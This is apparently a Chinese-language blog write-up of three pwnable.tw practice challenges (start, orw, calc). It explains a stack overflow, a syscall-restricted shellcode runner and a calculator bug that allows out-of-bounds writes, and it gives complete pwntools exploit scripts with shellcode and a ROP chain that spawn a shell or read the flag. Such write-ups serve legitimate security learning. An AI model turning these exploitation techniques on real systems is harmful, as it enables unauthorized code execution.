---
layout: post
title: pwnable.tw start/orw/calc
date: 2022-08-03 20:10:47
tags: pwnable.tw
---

## start

**保护全关**的32位程序。

```sh
$ objdump -d -M Intel ./start 

./start:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	54                   	push   %esp
 8048061:	68 9d 80 04 08       	push   $0x804809d
 8048066:	31 c0                	xor    %eax,%eax
 8048068:	31 db                	xor    %ebx,%ebx
 804806a:	31 c9                	xor    %ecx,%ecx
 804806c:	31 d2                	xor    %edx,%edx
 804806e:	68 43 54 46 3a       	push   $0x3a465443
 8048073:	68 74 68 65 20       	push   $0x20656874
 8048078:	68 61 72 74 20       	push   $0x20747261
 804807d:	68 73 20 73 74       	push   $0x74732073
 8048082:	68 4c 65 74 27       	push   $0x2774654c
 8048087:	89 e1                	mov    %esp,%ecx
 8048089:	b2 14                	mov    $0x14,%dl
 804808b:	b3 01                	mov    $0x1,%bl
 804808d:	b0 04                	mov    $0x4,%al
 804808f:	cd 80                	int    $0x80
 8048091:	31 db                	xor    %ebx,%ebx
 8048093:	b2 3c                	mov    $0x3c,%dl
 8048095:	b0 03                	mov    $0x3,%al
 8048097:	cd 80                	int    $0x80
 8048099:	83 c4 14             	add    $0x14,%esp
 804809c:	c3                   	ret    

0804809d <_exit>:
 804809d:	5c                   	pop    %esp
 804809e:	31 c0                	xor    %eax,%eax
 80480a0:	40                   	inc    %eax
 80480a1:	cd 80                	int    $0x80
```

有3个syscall，一个write把一个字符串写到1，一个read从0读入字符到栈上，一个exit退出。显然read这边有个栈溢出漏洞，可以把返回地址覆盖掉。

首先想到直接在返回地址后面写一段shellcode执行execve("/bin/sh", 0, 0)，想盲打打中栈地址。但是试了几次发现即使是32位的程序，也有至少19个二进制位的随机变化，要十几个小时才能打中，于是算了。
然后想ROP试试，但是怎么想也想不出方法。
最后想到重新执行的思想，我可以**重新执行write和read**，把栈上的栈地址泄露出来，这样就可以把控制流精准控制成我的shellcode了。

```python
from pwn import *
context.arch = 'i386'

# p = process("./start")
p = remote("chall.pwnable.tw", 10000)

payload = b'a' * 0x14
payload += pack(0x08048087, 32)

p.recv()
p.send(payload)
mes=p.recv()
print(mes)

stack = unpack(mes[0:0+4]) - 4
shcode_addr = stack + 0x14 + 4
print(hex(stack))

payload = b'/bin/sh' + b'\x00'*13
payload += pack(shcode_addr)
payload += asm(f'''
mov eax, 11
mov ebx, {stack}
mov ecx, 0
mov edx, 0
int 0x80
''')

p.send(payload)
p.interactive()
```

## orw

程序会读入一段shellcode并执行，并且限制syscall只能调用orw。
先用read读入/home/orw/flag，然后orw就好了。

```python
from pwn import *
context.arch = 'i386'

# p = process(["strace", "./orw"])
p = remote("chall.pwnable.tw", 10001)

buf_addr = 0x0804A0C0

payload = asm(f'''
mov eax, 3
xor ebx, ebx
mov ecx, {buf_addr}
mov edx, 20
int 0x80

mov eax, 5
mov ebx, {buf_addr}
xor ecx, ecx
xor edx, edx
int 0x80

mov ebx, eax
mov eax, 3
mov ecx, {buf_addr}
mov edx, 50
int 0x80

mov eax, 4
mov ebx, 1
mov ecx, {buf_addr}
mov edx, 50
int 0x80
''')

print(p.recvS())
p.sendline(payload)
p.send(b'/home/orw/flag')
p.interactive()
```

## calc

除了PIE，其他保护全开。
是一个计算器，将读入的表达式转换成逆波兰表达法之后，用栈进行求值。

主要漏洞在于，在利用栈进行求值的时候，这个存数字的栈用\[0]存储栈的高度，用\[1]及以上空间存储数字。
所以当我输入 `+1` 的时候，这个1将会直接被加到栈的高度上，之后就可以通过修改栈高度+构造表达式。来达成栈以上地址任意读写（实际只用到了任意写）。

遇到了两个坑，一是写入一个数字的时候，比这个数字低位的数字将会受到影响；二是运算数不能为0。

前者利用倒过来写入（从上往下写）解决，后者我利用构造表达式解决（后来发现了更简单的方法，由于是将运算数与"0"进行strcmp来判断的，我可以输入000来表示0）。

```python
from pwn import *
context.arch = 'i386'

# p = process(["strace", "./calc"])
p = remote("chall.pwnable.tw", 10100)

read_addr = 0x0806e6d0
buf_addr = 0x080ecf00

int_0x80 = 0x08070880
sh_str = 0x08051ce9
pop_eax = 0x0805c34b
pop_ecx_ebx = 0x080701d1
pop_edx = 0x080701aa
pop_3 = 0x080483ac

# 360 read
# 361 0
# 362 buf
# 363 10

# 364 pop_eax
# 365 11
# 366 pop_ecx_ebx
# 367 0
# 368 sh_str
# 369 pop_edx
# 370 0
# 371 int_0x80

payload = f'''+371+{int_0x80}/1-{int_0x80}
+370+{pop_edx}
+368+{buf_addr}/1-{buf_addr}
+367+{pop_ecx_ebx}
+366+11
+365+{pop_eax}
+364+10
+362+{buf_addr}/1-{buf_addr}
+361+{pop_3}
+360+{read_addr}
'''.encode('ascii')

print(p.recvS())
p.sendline(payload)
p.send(b'/bin/sh\x00')
p.interactive()
```


